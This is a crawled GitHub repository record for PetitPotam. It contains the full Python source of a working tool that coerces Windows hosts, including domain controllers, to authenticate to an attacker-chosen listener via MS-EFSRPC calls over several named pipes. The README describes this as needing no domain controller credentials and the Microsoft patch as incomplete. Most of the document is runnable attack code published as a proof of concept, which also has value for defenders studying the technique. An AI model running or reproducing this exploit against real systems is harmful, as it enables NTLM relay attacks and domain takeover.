{
  "metadata": {
    "timestamp": 1736710099448,
    "page": 718,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjcyMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "topotam/PetitPotam",
      "stars": 1882,
      "defaultBranch": "main",
      "files": [
        {
          "name": "PetitPotam.exe",
          "type": "blob",
          "size": 107,
          "content": null
        },
        {
          "name": "PetitPotam.py",
          "type": "blob",
          "size": 16.42578125,
          "content": "#!/usr/bin/env python\n# \n# Author: GILLES Lionel aka topotam (@topotam77)\n# \n# Greetz : grenadine(@Greynardine), skar(@__skar), didakt(@inf0sec1), plissken, pixis(@HackAndDo) my friends!\n# \"Most of\" the code stolen from dementor.py from @3xocyte ;)\n\n\nimport sys\nimport argparse\n\nfrom impacket import system_errors\nfrom impacket.dcerpc.v5 import transport\nfrom impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT\nfrom impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY\nfrom impacket.uuid import uuidtup_to_bin\n\n\nshow_banner = '''\n                                                                                               \n              ___            _        _      _        ___            _                     \n             | _ \\   ___    | |_     (_)    | |_     | _ \\   ___    | |_    __ _    _ __   \n             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \\   |  _|  / _` |  | '  \\  \n            _|_|_   \\___|   _\\__|   _|_|_   _\\__|   _|_|_   \\___/   _\\__|  \\__,_|  |_|_|_| \n          _| \"\"\" |_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_| \"\"\" |_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"| \n          \"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-' \n                                         \n              PoC to elicit machine account authentication via some MS-EFSRPC functions\n                                      by topotam (@topotam77)\n      \n                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN\n\n\n'''\n\nclass DCERPCSessionError(DCERPCException):\n    def __init__(self, error_string=None, error_code=None, packet=None):\n        DCERPCException.__init__(self, error_string, error_code, packet)\n\n    def __str__( self ):\n        key = self.error_code\n        if key in system_errors.ERROR_MESSAGES:\n            error_msg_short = system_errors.ERROR_MESSAGES[key][0]\n            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]\n            return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)\n        else:\n            return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code\n\n\n################################################################################\n# STRUCTURES\n################################################################################\nclass EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):\n    align = 1\n    structure = (\n        ('Data', '20s'),\n    )\nclass EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):\n    align = 1\n    structure = (\n        ('Data', '20s'),\n    )\nclass EFS_EXIM_PIPE(NDRSTRUCT):\n    align = 1\n    structure = (\n        ('Data', ':'),\n    )\nclass EFS_HASH_BLOB(NDRSTRUCT):\n    \n    structure = (\n        ('Data', DWORD),\n        ('cbData', PCHAR),\n    )\nclass EFS_RPC_BLOB(NDRSTRUCT):\n    \n    structure = (\n        ('Data', DWORD),\n        ('cbData', PCHAR),\n    )\n    \nclass EFS_CERTIFICATE_BLOB(NDRSTRUCT):\n    structure = (\n        ('Type', DWORD),\n        ('Data', DWORD),\n        ('cbData', PCHAR),\n    )    \nclass ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):\n    structure = (\n        ('Lenght', DWORD),\n        ('SID', RPC_SID),\n        ('Hash', EFS_HASH_BLOB),\n        ('Display', LPWSTR),\n    )   \nclass ENCRYPTION_CERTIFICATE(NDRSTRUCT):\n    structure = (\n        ('Lenght', DWORD),\n        ('SID', RPC_SID),\n        ('Hash', EFS_CERTIFICATE_BLOB),\n   \n    )   \nclass ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):\n    align = 1\n    structure = (\n        ('Cert', DWORD),\n        ('Users', ENCRYPTION_CERTIFICATE_HASH),\n    )\nclass ENCRYPTED_FILE_METADATA_SIGNATURE(NDRSTRUCT):    \n    structure = (\n        ('Type', DWORD),\n        ('HASH', ENCRYPTION_CERTIFICATE_HASH_LIST),\n        ('Certif', ENCRYPTION_CERTIFICATE),\n        ('Blob', EFS_RPC_BLOB),\n    )   \nclass EFS_RPC_BLOB(NDRSTRUCT):\n    structure = (\n        ('Data', DWORD),\n        ('cbData', PCHAR),\n    )\nclass ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):\n    align = 1\n    structure = (\n        ('Data', ':'),\n    )\n\n################################################################################\n# RPC CALLS\n################################################################################\nclass EfsRpcOpenFileRaw(NDRCALL):\n    opnum = 0\n    structure = (\n        ('fileName', WSTR), \n        ('Flag', ULONG),\n    )\n    \nclass EfsRpcOpenFileRawResponse(NDRCALL):\n    structure = (\n        ('hContext', EXIMPORT_CONTEXT_HANDLE),\n        ('ErrorCode', ULONG),\n    )\nclass EfsRpcEncryptFileSrv(NDRCALL):\n    opnum = 4\n    structure = (\n        ('FileName', WSTR),\n    )\n\nclass EfsRpcEncryptFileSrvResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )\nclass EfsRpcDecryptFileSrv(NDRCALL):\n    opnum = 5\n    structure = (\n        ('FileName', WSTR),\n        ('Flag', ULONG),\n    )\n\nclass EfsRpcDecryptFileSrvResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )\nclass EfsRpcQueryUsersOnFile(NDRCALL):\n    opnum = 6\n    structure = (\n        ('FileName', WSTR),\n        \n    )\nclass EfsRpcQueryUsersOnFileResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )\nclass EfsRpcQueryRecoveryAgents(NDRCALL):\n    opnum = 7\n    structure = (\n        ('FileName', WSTR),\n        \n    )\nclass EfsRpcQueryRecoveryAgentsResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )\nclass EfsRpcRemoveUsersFromFile(NDRCALL):\n    opnum = 8\n    structure = (\n        ('FileName', WSTR),\n        ('Users', ENCRYPTION_CERTIFICATE_HASH_LIST)\n        \n    )\nclass EfsRpcRemoveUsersFromFileResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )\nclass EfsRpcAddUsersToFile(NDRCALL):\n    opnum = 9\n    structure = (\n        ('FileName', WSTR),\n        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST)\n        \n    )\nclass EfsRpcAddUsersToFileResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )    \nclass EfsRpcFileKeyInfo(NDRCALL):\n    opnum = 12\n    structure = (\n        ('FileName', WSTR),\n        ('infoClass', DWORD),\n    )\nclass EfsRpcFileKeyInfoResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )\nclass EfsRpcDuplicateEncryptionInfoFile(NDRCALL):\n    opnum = 13\n    structure = (\n        ('SrcFileName', WSTR),\n        ('DestFileName', WSTR),\n        ('dwCreationDisposition', DWORD),\n        ('dwAttributes', DWORD),\n        ('RelativeSD', EFS_RPC_BLOB),\n        ('bInheritHandle', BOOL),\n    ) \n    \nclass EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )\nclass EfsRpcAddUsersToFileEx(NDRCALL):\n    opnum = 15\n    structure = (\n        ('dwFlags', DWORD),\n        ('Reserved', EFS_RPC_BLOB),\n        ('FileName', WSTR),\n        ('dwAttributes', DWORD),\n        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST),\n    ) \n    \nclass EfsRpcAddUsersToFileExResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )\nclass EfsRpcFileKeyInfoEx(NDRCALL):\n    opnum = 16\n    structure = (\n        ('dwFileKeyInfoFlags', DWORD),\n        ('Reserved', EFS_RPC_BLOB),\n        ('FileName', WSTR),\n        ('InfoClass', DWORD),\n    )\nclass EfsRpcFileKeyInfoExResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )\nclass EfsRpcGetEncryptedFileMetadata(NDRCALL):\n    opnum = 18\n    structure = (\n        ('FileName', WSTR),\n    )\nclass EfsRpcGetEncryptedFileMetadataResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )   \nclass EfsRpcSetEncryptedFileMetadata(NDRCALL):\n    opnum = 19\n    structure = (\n        ('FileName', WSTR),\n        ('OldEfsStreamBlob', EFS_RPC_BLOB),\n        ('NewEfsStreamBlob', EFS_RPC_BLOB),\n        ('NewEfsSignature', ENCRYPTED_FILE_METADATA_SIGNATURE),\n    )\nclass EfsRpcSetEncryptedFileMetadataResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )\nclass EfsRpcEncryptFileExSrv(NDRCALL):\n    opnum = 21\n    structure = (\n        ('FileName', WSTR),\n        ('ProtectorDescriptor', WSTR),\n        ('Flags', ULONG),\n    )\nclass EfsRpcEncryptFileExSrvResponse(NDRCALL):\n    structure = (\n        ('ErrorCode', ULONG),\n    )\n#class EfsRpcQueryProtectors(NDRCALL):\n#    opnum = 21\n#    structure = (\n#        ('FileName', WSTR),\n#        ('ppProtectorList', PENCRYPTION_PROTECTOR_LIST),\n#    )\n#class EfsRpcQueryProtectorsResponse(NDRCALL):\n#    structure = (\n#        ('ErrorCode', ULONG),\n#    )\n\n################################################################################\n# OPNUMs and their corresponding structures\n################################################################################\nOPNUMS = {\n    0   : (EfsRpcOpenFileRaw, EfsRpcOpenFileRawResponse),\n    4   : (EfsRpcEncryptFileSrv, EfsRpcEncryptFileSrvResponse),\n    5   : (EfsRpcDecryptFileSrv, EfsRpcDecryptFileSrvResponse),\n    6   : (EfsRpcQueryUsersOnFile, EfsRpcQueryUsersOnFileResponse),\n    7   : (EfsRpcQueryRecoveryAgents, EfsRpcQueryRecoveryAgentsResponse),\n    8   : (EfsRpcRemoveUsersFromFile, EfsRpcRemoveUsersFromFileResponse),\n    9   : (EfsRpcAddUsersToFile, EfsRpcAddUsersToFileResponse),\n    12   : (EfsRpcFileKeyInfo, EfsRpcFileKeyInfoResponse),\n    13   : (EfsRpcDuplicateEncryptionInfoFile, EfsRpcDuplicateEncryptionInfoFileResponse),\n    15   : (EfsRpcAddUsersToFileEx, EfsRpcAddUsersToFileExResponse),\n    16   : (EfsRpcFileKeyInfoEx, EfsRpcFileKeyInfoExResponse),\n    18   : (EfsRpcGetEncryptedFileMetadata, EfsRpcGetEncryptedFileMetadataResponse),\n    19   : (EfsRpcSetEncryptedFileMetadata, EfsRpcSetEncryptedFileMetadataResponse),\n    21   : (EfsRpcEncryptFileExSrv, EfsRpcEncryptFileExSrvResponse),\n#    22   : (EfsRpcQueryProtectors, EfsRpcQueryProtectorsResponse),\n}\n \nclass CoerceAuth():\n    def connect(self, username, password, domain, lmhash, nthash, target, pipe, doKerberos, dcHost, targetIp):\n        binding_params = {\n            'lsarpc': {\n                'stringBinding': r'ncacn_np:%s[\\PIPE\\lsarpc]' % target,\n                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')\n            },\n            'efsr': {\n                'stringBinding': r'ncacn_np:%s[\\PIPE\\efsrpc]' % target,\n                'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')\n            },\n            'samr': {\n                'stringBinding': r'ncacn_np:%s[\\PIPE\\samr]' % target,\n                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')\n            },\n            'lsass': {\n                'stringBinding': r'ncacn_np:%s[\\PIPE\\lsass]' % target,\n                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')\n            },\n            'netlogon': {\n                'stringBinding': r'ncacn_np:%s[\\PIPE\\netlogon]' % target,\n                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')\n            },\n        }\n        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])\n        if hasattr(rpctransport, 'set_credentials'):\n            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)\n\n        if doKerberos:\n            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)\n        if targetIp:\n            rpctransport.setRemoteHost(targetIp)\n\n        dce = rpctransport.get_dce_rpc()\n        dce.set_auth_type(RPC_C_AUTHN_WINNT)\n        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n        print(\"[-] Connecting to %s\" % binding_params[pipe]['stringBinding'])\n        try:\n            dce.connect()\n        except Exception as e:\n            print(\"Something went wrong, check error status => %s\" % str(e))  \n            #sys.exit()\n            return\n        print(\"[+] Connected!\")\n        print(\"[+] Binding to %s\" % binding_params[pipe]['MSRPC_UUID_EFSR'][0])\n        try:\n            dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))\n        except Exception as e:\n            print(\"Something went wrong, check error status => %s\" % str(e)) \n            #sys.exit()\n            return\n        print(\"[+] Successfully bound!\")\n        return dce\n        \n    def EfsRpcOpenFileRaw(self, dce, listener):\n        print(\"[-] Sending EfsRpcOpenFileRaw!\")\n        try:\n            request = EfsRpcOpenFileRaw()\n            request['fileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n            request['Flag'] = 0\n            #request.dump()\n            resp = dce.request(request)\n            \n        except Exception as e:\n            if str(e).find('ERROR_BAD_NETPATH') >= 0:\n                print('[+] Got expected ERROR_BAD_NETPATH exception!!')\n                print('[+] Attack worked!')\n                #sys.exit()\n                return None\n            if str(e).find('rpc_s_access_denied') >= 0:\n                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')\n                print('[+] OK! Using unpatched function!')\n                print(\"[-] Sending EfsRpcEncryptFileSrv!\")\n                try:\n                    request = EfsRpcEncryptFileSrv()\n                    request['FileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n                    resp = dce.request(request)\n                except Exception as e:\n                    if str(e).find('ERROR_BAD_NETPATH') >= 0:\n                        print('[+] Got expected ERROR_BAD_NETPATH exception!!')\n                        print('[+] Attack worked!')\n                        pass\n                    else:\n                        print(\"Something went wrong, check error status => %s\" % str(e)) \n                        return None\n                        #sys.exit()\n                \n            else:\n                print(\"Something went wrong, check error status => %s\" % str(e)) \n                return None\n                #sys.exit()\n\ndef main():\n    parser = argparse.ArgumentParser(add_help = True, description = \"PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()\")\n    parser.add_argument('-u', '--username', action=\"store\", default='', help='valid username')\n    parser.add_argument('-p', '--password', action=\"store\", default='', help='valid password (if omitted, it will be asked unless -no-pass)')\n    parser.add_argument('-d', '--domain', action=\"store\", default='', help='valid domain name')\n    parser.add_argument('-hashes', action=\"store\", metavar=\"[LMHASH]:NTHASH\", help='NT/LM hashes (LM hash can be empty)')\n\n    parser.add_argument('-no-pass', action=\"store_true\", help='don\\'t ask for password (useful for -k)')\n    parser.add_argument('-k', action=\"store_true\", help='Use Kerberos authentication. Grabs credentials from ccache file '\n                        '(KRB5CCNAME) based on target parameters. If valid credentials '\n                        'cannot be found, it will use the ones specified in the command '\n                        'line')\n    parser.add_argument('-dc-ip', action=\"store\", metavar=\"ip address\", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')\n    parser.add_argument('-target-ip', action='store', metavar=\"ip address\",\n                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '\n                        'This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')\n\n    parser.add_argument('-pipe', action=\"store\", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass', 'all'], default='lsarpc', help='Named pipe to use (default: lsarpc) or all')\n    parser.add_argument('listener', help='ip address or hostname of listener')\n    parser.add_argument('target', help='ip address or hostname of target')\n    options = parser.parse_args()\n\n    if options.hashes is not None:\n        lmhash, nthash = options.hashes.split(':')\n    else:\n        lmhash = ''\n        nthash = ''\n\n    print(show_banner)\n\n    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:\n        from getpass import getpass\n        options.password = getpass(\"Password:\")\n    \n    plop = CoerceAuth()\n    \n    if options.pipe == \"all\":\n        all_pipes = ['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass']\n    else:\n        all_pipes = [options.pipe]\n    \n    for all_pipe in all_pipes:\n        print(\"Trying pipe\", all_pipe)\n        dce = plop.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, pipe=all_pipe, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip)\n        if dce is not None:\n            plop.EfsRpcOpenFileRaw(dce, options.listener)\n            dce.disconnect()\n    sys.exit()   \n             \nif __name__ == '__main__':\n    main()\n"
        },
        {
          "name": "PetitPotam.sln",
          "type": "blob",
          "size": 1.416015625,
          "content": "﻿\r\nMicrosoft Visual Studio Solution File, Format Version 12.00\r\n# Visual Studio Version 16\r\nVisualStudioVersion = 16.0.30011.22\r\nMinimumVisualStudioVersion = 10.0.40219.1\r\nProject(\"{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}\") = \"PetitPotam\", \"PetitPotam\\PetitPotam.vcxproj\", \"{D78924E1-7F2B-4315-A2D2-24124C7828F8}\"\r\nEndProject\r\nGlobal\r\n\tGlobalSection(SolutionConfigurationPlatforms) = preSolution\r\n\t\tDebug|x64 = Debug|x64\r\n\t\tDebug|x86 = Debug|x86\r\n\t\tRelease|x64 = Release|x64\r\n\t\tRelease|x86 = Release|x86\r\n\tEndGlobalSection\r\n\tGlobalSection(ProjectConfigurationPlatforms) = postSolution\r\n\t\t{D78924E1-7F2B-4315-A2D2-24124C7828F8}.Debug|x64.ActiveCfg = Debug|x64\r\n\t\t{D78924E1-7F2B-4315-A2D2-24124C7828F8}.Debug|x64.Build.0 = Debug|x64\r\n\t\t{D78924E1-7F2B-4315-A2D2-24124C7828F8}.Debug|x86.ActiveCfg = Debug|Win32\r\n\t\t{D78924E1-7F2B-4315-A2D2-24124C7828F8}.Debug|x86.Build.0 = Debug|Win32\r\n\t\t{D78924E1-7F2B-4315-A2D2-24124C7828F8}.Release|x64.ActiveCfg = Release|x64\r\n\t\t{D78924E1-7F2B-4315-A2D2-24124C7828F8}.Release|x64.Build.0 = Release|x64\r\n\t\t{D78924E1-7F2B-4315-A2D2-24124C7828F8}.Release|x86.ActiveCfg = Release|Win32\r\n\t\t{D78924E1-7F2B-4315-A2D2-24124C7828F8}.Release|x86.Build.0 = Release|Win32\r\n\tEndGlobalSection\r\n\tGlobalSection(SolutionProperties) = preSolution\r\n\t\tHideSolutionNode = FALSE\r\n\tEndGlobalSection\r\n\tGlobalSection(ExtensibilityGlobals) = postSolution\r\n\t\tSolutionGuid = {2683AD05-3073-415F-9E36-E10040EB59BD}\r\n\tEndGlobalSection\r\nEndGlobal\r\n"
        },
        {
          "name": "PetitPotam",
          "type": "tree",
          "content": null
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 1.1171875,
          "content": "# PetitPotam\n\nPoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions :)\n\nThe tools use the LSARPC named pipe with inteface c681d488-d850-11d0-8c52-00c04fd90f7e because it's more prevalent. But it's possible to trigger with the EFSRPC named pipe and interface df1941c5-fe89-4e79-bf10-463657acf44d. It doesn't need credentials against Domain Controller :D\n\nDisabling the EFS service seems not to mitigate the \"feature\"\n\nThe Python one require Impacket to be installed, the Windows PoC was done on VS 2019 Community.\nIf compilation problem, remember to add Rpcrt4.lib in the linker. Compile in x86.\n\nInspired by the previous work on MS-RPRN from @tifkin_ & @elad_shamir and others SpecterOps guys.\n\nIncomplete patch from Microsoft :) https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942\n\nMS-EFSRPC - Encrypting File System Remote (EFSRPC) Protocol\nhttps://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31\n\n![image](https://user-images.githubusercontent.com/20562821/126829486-3c6fa938-6e6c-4c61-ace5-74c99f16bccf.png)\n\n"
        }
      ]
    }
  ]
}